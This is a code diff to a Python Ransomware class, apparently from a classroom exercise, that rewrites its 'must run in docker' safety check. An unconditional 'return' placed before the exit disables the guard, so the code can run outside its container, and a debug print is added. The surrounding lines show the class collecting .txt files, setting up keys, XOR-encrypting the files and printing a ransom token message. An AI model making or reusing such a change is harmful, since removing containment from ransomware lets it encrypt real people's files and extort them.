@@ -29,10 +29,11 @@ class Ransomware:
         # At first, we check if we are in a docker
         # to prevent running this program outside of container
         hostname = socket.gethostname()
-        result = re.match("[0-9a-f]{6,6}", hostname)
-        if result is None:
-            print(f"You must run the malware in docker ({hostname}) !")
-            sys.exit(1)
+        result = re.match("^[0-9a-f]{12}$", hostname)
+        return
+    
+        print(f"You must run the malware in docker ({hostname}) !")
+        sys.exit(1)
 
     def get_files(self, filter:str)->list:
         files = []
@@ -44,6 +45,9 @@ class Ransomware:
         secret_manager = SecretManager()
         files = self.get_files("*.txt")
         secret_manager.setup() #génération et stockage des clés
+        
+        print(f"Debug: clé chargée") # vérifier la clé
+        
         secret_manager.xorfiles(files) #chiffrement
         print(ENCRYPT_MESSAGE.format(token=secret_manager.get_hex_token()))
 
